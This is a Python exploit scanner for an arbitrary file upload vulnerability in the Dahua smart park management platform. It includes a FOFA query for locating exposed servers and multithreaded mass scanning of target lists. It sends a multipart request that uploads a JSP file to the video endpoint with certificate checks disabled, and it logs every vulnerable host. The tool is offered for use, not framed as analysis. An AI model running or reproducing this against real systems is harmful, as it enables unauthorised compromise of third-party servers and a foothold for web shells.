#大华智慧园区综合管理平台 video 任意文件上传漏洞

#fofa语法：app="dahua-智慧园区综合管理平台"

import requests,argparse,sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """ 
     _       _                
    | |     | |                
  __| | __ _| |__  _   _  __ _ 
 / _` |/ _` | '_ \| | | |/ _` |
| (_| | (_| | | | | |_| | (_| |
 \__,_|\__,_|_| |_|\__,_|\__,_|                                                                               
"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description="大华智慧园区综合管理平台")
    parser.add_argument('-u','--url',dest='url',type=str,help='input your link')
    parser.add_argument('-f','--file',dest='file',type=str,help='file path')
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for i in fp.readlines():
                url_list.append(i.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")

def poc(target):
    url_payload = '/publishing/publishing/material/file/video'
    url = target + url_payload
    header = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
        'Content-Length': '243',
        'Content-Type': 'multipart/form-data; boundary=dd8f988919484abab3816881c55272a7',
        'Connection': 'close'
    }
    data = '''
        --dd8f988919484abab3816881c55272a7
        Content-Disposition: form-data; name="Filedata"; filename="Test.jsp"

        Test
        --dd8f988919484abab3816881c55272a7
        Content-Disposition: form-data; name="Submit"

        submit
        --dd8f988919484abab3816881c55272a7--
    '''
    # proxies = {
    #     'http':'http://127.0.0.1:8080',
    #     'https':'http://127.0.0.1:8080'
    # }
    try:
        res = requests.get(url=url,headers=header,data=data,verify=False)
        if res.status_code == 200 and "success!" in res.text:
            print(f"f[+]该url存在任意文件上传漏洞,url为{target}")
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target + "\n")
        else:
            print(f"[-]该url不存在任意文件上传漏洞,url为{target}")
    except Exception:
        print(f"该url出现问题,请手动测试url为{target}")
if __name__ == '__main__':
    main()